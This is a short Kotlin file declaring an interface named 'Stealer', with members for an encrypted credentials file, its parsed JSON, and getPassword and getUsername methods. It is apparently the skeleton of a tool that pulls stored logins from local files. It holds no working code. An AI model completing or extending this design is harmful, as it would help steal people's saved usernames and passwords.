package io.groax.api

import com.google.gson.JsonObject
import com.google.gson.JsonParser
import java.io.File

/**
 * @author Groax
 */
interface Stealer {

    val encryptedLocation: File

    var encryptedJson: JsonObject

    val parser: JsonParser
        get() = JsonParser()

    fun getPassword(): String

    fun getUsername(): String

}